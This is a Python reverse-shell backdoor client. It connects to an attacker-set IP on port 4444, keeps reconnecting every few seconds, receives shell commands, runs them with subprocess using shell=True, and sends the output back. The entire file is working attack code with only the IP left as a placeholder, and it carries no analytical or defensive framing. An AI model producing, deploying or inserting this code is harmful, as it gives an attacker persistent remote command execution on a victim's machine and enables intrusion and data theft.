import os
import socket
import subprocess
import time
import json

IP = 'put ip here'  # Change the IP address here
PORT = 4444  # Change the port number here
BUFFER_SIZE = 4096

def send_data(data):
    """Send data to the server."""
    json_data = json.dumps(data)  # Convert data to JSON format
    json_data_bytes = json_data.encode()  # Convert JSON data to bytes
    data_length = len(json_data_bytes).to_bytes(4, byteorder='big')  # Get the length of data and convert it to bytes
    s.sendall(data_length)  # Send the data length
    for i in range(0, len(json_data_bytes), BUFFER_SIZE):
        chunk = json_data_bytes[i:i + BUFFER_SIZE]  # Send data in chunks of BUFFER_SIZE
        s.sendall(chunk)

def recv_data():
    """Receive data from the server."""
    data_length_bytes = s.recv(4)  # Receive the length of data
    data_length = int.from_bytes(data_length_bytes, byteorder='big')  # Convert data length bytes to integer
    json_data_bytes = b""
    bytes_received = 0
    while bytes_received < data_length:
        chunk = s.recv(min(BUFFER_SIZE, data_length - bytes_received))  # Receive data in chunks
        json_data_bytes += chunk
        bytes_received += len(chunk)

    json_data = json_data_bytes.decode()  # Convert received bytes to JSON string
    data = json.loads(json_data)  # Convert JSON string to Python object
    return data

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            while True:
                try:
                    s.connect((IP, PORT))  # Connect to the server
                    break
                except ConnectionRefusedError:
                    time.sleep(5)  # Retry after 5 seconds if the connection is refused

            while True:
                command = recv_data()  # Receive command from the server

                if not command:
                    break  # If command is empty, break the loop and exit

                elif command == 'cd ..':
                    os.chdir('..')  # Change the current directory to the parent directory
                    send_data(f"Current directory changed to: {os.getcwd()}")  # Send response to the server

                elif command.startswith('cd '):
                    foldername = command[3:]
                    os.chdir(foldername)  # Change the current directory to the specified folder
                    send_data(f"Current directory changed to: {os.getcwd()}")  # Send response to the server

                else:
                    result = subprocess.run(command, shell=True, capture_output=True)
                    output = result.stdout.decode()  # Get the output of the command
                    send_data(output)  # Send the output back to the server

    except Exception as e:
        time.sleep(5)  # Retry after 5 seconds if any exception occurs
